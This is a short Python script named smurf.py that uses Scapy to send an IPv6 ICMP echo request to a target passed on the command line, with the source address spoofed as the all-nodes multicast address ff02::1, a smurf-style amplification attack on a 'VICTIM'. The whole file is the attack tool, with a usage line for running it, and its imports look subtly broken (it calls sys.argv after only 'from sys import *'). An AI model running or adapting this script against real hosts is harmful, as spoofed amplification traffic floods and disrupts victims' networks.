#!/usr/bin/python
# Jack Cardwell
# March 4, 2018

# smurf.py spoofs the source node to be a broadcast address
from scapy.all import *
from sys import *
from math import *

def smurf():

    # get the number of arguments
    if len(sys.argv)!= 2:
        print("Error: Please enter the correct number of arguments.")
        print("Usage: ./smurf.py [VICTIM]")
        exit(2)

    tgt = sys.argv[1]

    # create the ping request
    ip = IPv6(src = "ff02::1", dst=tgt)
    icmp =ICMPv6EchoRequest()

    send(ip/icmp)

smurf()
